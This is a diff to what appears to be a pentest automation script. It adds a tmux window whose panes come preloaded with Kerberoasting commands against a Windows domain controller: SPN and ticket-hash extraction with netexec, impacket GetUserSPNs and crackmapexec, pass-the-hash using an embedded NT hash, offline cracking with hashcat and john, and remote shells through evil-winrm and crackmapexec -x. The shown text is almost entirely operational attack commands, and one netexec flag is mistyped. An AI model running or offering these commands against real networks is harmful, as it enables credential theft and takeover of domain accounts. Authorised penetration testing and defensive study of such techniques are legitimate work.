@@ -1927,14 +1927,60 @@ tmux send-keys -t PT:12.6 "hashcat -m 18200 -d 3 -a 0 my.hash rockyou.txt"
 tmux send-keys -t PT:12.7 "# Kerberos-ASREP-roasting: Access remote target with USERNAME-PASS" Enter
 tmux send-keys -t PT:12.7 "evil-winrm -i $ip -u <utente> -p <password>"
 tmux send-keys -t PT:12.8 "# Kerberos-ASREP-roasting: Access remote target with USERNAME-PASS" Enter
-tmux send-keys -t PT:12.8 "crackmapexec smb $ip -u <utente> -p <password> -x "<comando>""
+tmux send-keys -t PT:12.8 "crackmapexec smb $ip -u <utente> -p <password> -x \"<comando>\""
 tmux send-keys -t PT:12.9 "# Kerberos-ASREP-roasting: Access remote target with PTT" Enter
 tmux send-keys -t PT:12.9 "evil-winrm -i $ip -u <utente> -H <hash_NT>"
 tmux send-keys -t PT:12.10 "# Kerberos-ASREP-roasting: Access remote target with PTT" Enter
 tmux send-keys -t PT:12.10 "crackmapexec smb $ip -u <utente> -H <HASH-NT> -x \"<comando>\""
+cd $folderProject
 
-
-
+cd $folderProjectAuthN
+# Kerberos - KERBEROASTING
+tmux new-window -t PT:13 -n 'Kerberos - KERBEROASTING'
+tmux split-window -v -t PT:13.0
+tmux select-pane -t "13.0"
+tmux split-window -h -t "13.0"
+tmux split-window -h -t "13.0"
+tmux split-window -h -t "13.0"
+tmux split-window -h -t "13.0"
+tmux split-window -h -t "13.0"
+tmux split-window -h -t "13.0"
+tmux split-window -v -t "13.0"
+tmux split-window -v -t PT:13.7
+tmux select-pane -t "13.7"
+tmux split-window -h -t "13.7"
+tmux split-window -v -t PT:13.9
+tmux select-pane -t "13.9"
+tmux split-window -h -t "13.9"
+tmux split-window -h -t "13.9"
+tmux split-window -h -t "13.9"
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:13.0 "# Kerberos KERBEROASTING: Enumerate SPNs and HASH-NT with credentials"  Enter
+tmux send-keys -t PT:13.0 "netexec ldap $ip -u '<USER>' -p '<PASS>' –kerberosting"
+tmux send-keys -t PT:13.1 "# Kerberos KERBEROASTING: Enumerate SPNs and HASH-NT with credentials" Enter
+tmux send-keys -t PT:13.1 "python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip $ip '$domain/<USER>:<PASS>'"
+tmux send-keys -t PT:13.2 "# Kerberos KERBEROASTING: Enumerate SPNs and HASH-NT with credentials" Enter
+tmux send-keys -t PT:13.2 "crackmapexec ldap $ip -u <USER> -p '<PASS>' --kerberoasting kerberoastables.txt --kdcHost $ip"
+tmux send-keys -t PT:13.3 "# Kerberos KERBEROASTING: Enumerate SPNs and HASH-NT with ASREP-roasting users" Enter
+tmux send-keys -t PT:13.3 "python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -no-preauth -usersfile utenti.txt -dc-host $ip $domain/ -request"
+tmux send-keys -t PT:13.4 "# Kerberos KERBEROASTING: Enumerate SPNs and HASH-NT with ASREP-roasting single user" Enter
+tmux send-keys -t PT:13.4 "python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -no-preauth <USER> -dc-host $ip $domain/"
+tmux send-keys -t PT:13.5 "# Kerberos KERBEROASTING: Enumerate SPNs and HASH-NT with HASH-NT" Enter
+tmux send-keys -t PT:13.5 "python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef' -dc-ip $ip '$domain/<USER>'"
+tmux send-keys -t PT:13.6 "# Kerberos KERBEROASTING: Enumerate SPNs and HASH-NT with HASH-NT" Enter
+tmux send-keys -t PT:13.6 "crackmapexec ldap $ip -u <USER> -H '<HASH-NT>' --kerberoasting kerberoastables.txt --kdcHost $ip"
+tmux send-keys -t PT:13.7 "# Kerberos KERBEROASTING: Crack token TGT with hashcat" Enter
+tmux send-keys -t PT:13.7 "hashcat -m 13100 -d 3 -a 0 my.hash rockyou.txt"
+tmux send-keys -t PT:13.8 "# Kerberos KERBEROASTING: Crack token TGT with JOHN" Enter
+tmux send-keys -t PT:13.8 "john --format=krb5tgs --wordlist=passwords.txt kerberoastables.txt"
+tmux send-keys -t PT:13.9 "# Kerberos KERBEROASTING: Get a shell on remote system with CREDENTIALs" Enter
+tmux send-keys -t PT:13.9 "evil-winrm -i $ip -u <utente> -p <password>"
+tmux send-keys -t PT:13.10 "# Kerberos KERBEROASTING: Get a shell on remote system with CREDENTIALs" Enter
+tmux send-keys -t PT:13.10 "crackmapexec smb $ip -u <utente> -p <password> -x \"<comando>\""
+tmux send-keys -t PT:13.11 "# Kerberos KERBEROASTING: Get a shell on remote system with HASH-NT" Enter
+tmux send-keys -t PT:13.11 "evil-winrm -i $ip -u <utente> -H <hash_NT>"
+tmux send-keys -t PT:13.12 "# Kerberos KERBEROASTING: Get a shell on remote system with HASH-NT" Enter
+tmux send-keys -t PT:13.12 "crackmapexec smb $ip -u <utente> -H <HASH-NT> -x \"<comando>\""
 cd $folderProject
 
 # Attivazione della modalità interattiva
